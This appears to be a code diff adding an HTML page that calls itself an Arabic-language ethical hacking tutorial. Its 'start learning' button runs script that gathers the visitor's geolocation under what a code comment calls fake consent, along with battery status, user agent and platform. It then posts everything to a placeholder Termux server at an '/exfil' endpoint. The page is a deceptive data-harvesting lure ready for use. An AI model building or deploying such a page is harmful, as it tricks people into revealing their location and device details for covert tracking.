@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>تعلم الاختراق الأخلاقي</title>
+    <style>
+        body { background: black; color: lime; text-align: center; }
+        button { padding: 15px; font-size: 20px; margin: 20px; }
+    </style>
+</head>
+<body>
+    <h1>مرحبًا في موقع الاختراق الأخلاقي!</h1>
+    <button id="hackBtn">بدأ التعلم</button>
+
+    <script>
+        document.getElementById('hackBtn').addEventListener('click', async () => {
+            const data = {};
+            
+            // 1. الموقع الجغرافي (بموافقة وهمية)
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => 
+                        navigator.geolocation.getCurrentPosition(resolve, reject)
+                    );
+                    data.geo = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    };
+                } catch (e) {
+                    data.geo_error = e.message;
+                }
+            }
+
+            // 2. حالة البطارية
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: battery.level * 100 + "%",
+                        charging: battery.charging ? "شحن" : "غير شاحن"
+                    };
+                } catch {}
+            }
+
+            // 3. معلومات النظام
+            data.user_agent = navigator.userAgent;
+            data.platform = navigator.platform;
+            data.cookies = navigator.cookieEnabled;
+
+            // 4. إرسال البيانات إلى الترمكس
+            fetch('https://YOUR_TERMUX_SERVER/exfil', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => alert("تم البدء! تحقق من الترمكس."));
+        });
+    </script>
+</body>
+</html>
